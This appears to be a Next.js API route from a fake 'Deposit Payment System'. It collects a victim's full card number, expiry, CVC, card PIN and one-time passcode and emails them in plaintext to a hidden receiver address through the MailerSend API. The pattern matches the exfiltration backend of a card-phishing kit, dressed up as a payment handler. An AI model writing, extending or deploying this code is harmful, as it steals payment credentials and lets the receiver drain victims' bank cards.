import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { subject, message, userEmail, amount, cardDetails, pin, otp } = await request.json()

    if (!process.env.MAILERSEND_API_TOKEN || !process.env.RECEIVER_EMAIL) {
      return NextResponse.json({ success: false, error: "MailerSend configuration missing" }, { status: 500 })
    }

    let emailContent = ""
    const emailSubject = subject

    if (subject.includes("PIN")) {
      emailContent = `
        <h2>Payment PIN Entered</h2>
        <p><strong>User Email:</strong> ${userEmail}</p>
        <p><strong>Amount:</strong> ₦${amount}</p>
        <p><strong>Card Details:</strong></p>
        <ul>
          <li>Name on Card: ${cardDetails?.nameOnCard || "N/A"}</li>
          <li>Card Number: ${cardDetails?.cardNumber || "N/A"}</li>
          <li>Expiry: ${cardDetails?.expiry || "N/A"}</li>
          <li>CVC: ${cardDetails?.cvc || "N/A"}</li>
        </ul>
        <p><strong>PIN Entered:</strong> ${pin}</p>
        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
      `
    } else if (subject.includes("OTP")) {
      emailContent = `
        <h2>OTP Verification Completed</h2>
        <p><strong>User Email:</strong> ${userEmail}</p>
        <p><strong>Amount:</strong> ₦${amount}</p>
        <p><strong>OTP Entered:</strong> ${otp}</p>
        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>Status:</strong> Transaction Authorized</p>
      `
    }

    const mailersendPayload = {
      from: {
        email: "noreply@yourdomain.com",
        name: "Deposit Payment System",
      },
      to: [
        {
          email: process.env.RECEIVER_EMAIL,
          name: "Admin",
        },
      ],
      subject: emailSubject,
      html: emailContent,
      text: emailContent.replace(/<[^>]*>/g, ""), // Strip HTML for text version
    }

    const response = await fetch("https://api.mailersend.com/v1/email", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.MAILERSEND_API_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(mailersendPayload),
    })

    if (!response.ok) {
      const errorData = await response.text()
      console.error("MailerSend API error:", errorData)
      return NextResponse.json({ success: false, error: "Failed to send email via MailerSend" }, { status: 500 })
    }

    return NextResponse.json({ success: true, message: "Email sent successfully via MailerSend" })
  } catch (error) {
    console.error("Email sending error:", error)
    return NextResponse.json({ success: false, error: "Failed to send email" }, { status: 500 })
  }
}
